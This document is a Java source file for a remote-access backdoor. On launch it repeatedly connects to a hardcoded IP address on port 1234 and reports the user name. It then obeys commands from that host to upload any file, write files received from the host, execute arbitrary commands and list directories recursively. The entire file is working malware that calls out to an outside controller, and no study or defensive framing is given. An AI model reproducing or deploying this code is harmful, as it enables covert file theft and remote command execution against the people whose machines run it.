import org.apache.commons.io.FileUtils;

import java.io.*;
import java.net.Socket;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public class Main {
    static Socket socket;
    static DataOutputStream dataOutputStream;
    static DataInputStream dataInputStream;
    static boolean close = false;
    public static void main(String[] args) {
        while(true){
            try{
                if(close) break;
                socket = new Socket("217.79.31.41", 1234);
                dataInputStream = new DataInputStream(socket.getInputStream());
                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                dataOutputStream.writeUTF(System.getProperty("user.name"));
                while(true){
                    String input = dataInputStream.readUTF();
                    respond(input);
                }
            }
            catch (Exception ex){
                ex.printStackTrace();
            }
        }
    }

    private static void respond(String input){
        try{
            String[] params = input.split(" ");
            if(params[0].equalsIgnoreCase("read")){
                File requestedFile = new File(params[1]);
                FileInputStream fileInputStream = new FileInputStream(requestedFile.getAbsolutePath());
                byte[] fileContent = fileInputStream.readAllBytes();
                dataOutputStream.writeUTF("write " + requestedFile.getName());
                dataOutputStream.writeInt(fileContent.length);
                dataOutputStream.write(fileContent);
            }

            if(params[0].equalsIgnoreCase("close")){
                dataOutputStream.close();
                dataInputStream.close();
                socket.close();
                close = true;
            }

            if(params[0].equalsIgnoreCase("write")){
                int fileSize = dataInputStream.readInt();
                byte[] fileContent = new byte[fileSize];
                dataInputStream.readFully(fileContent);
                String path = params[1];
                FileUtils.writeByteArrayToFile(new File(path), fileContent);
            }

            if(params[0].equalsIgnoreCase("execute")){
                Process p = Runtime.getRuntime().exec(params[1]);
            }

            if(params[0].equalsIgnoreCase("dir")){
                List<String> filenames = new ArrayList<>();
                Path dir = Path.of(params[1]);
                getFileNames(filenames, dir);
                StringBuilder builder = new StringBuilder();
                for (String filename : filenames) {
                    builder.append(filename).append(',');
                }
                dataOutputStream.writeUTF(builder.toString());
            }
        }
        catch (Exception ex){
            ex.printStackTrace();
        }
    }

    public static List<String> getFileNames(List<String> fileNames, Path dir) {
        try(DirectoryStream<Path> stream = Files.newDirectoryStream(dir)) {
            for (Path path : stream) {
                if(path.toFile().isDirectory()) {
                    getFileNames(fileNames, path);
                }
                else {
                    fileNames.add(path.toAbsolutePath().toString());
                }
            }
        }
        catch(IOException e) {
            e.printStackTrace();
        }
        return fileNames;
    }
}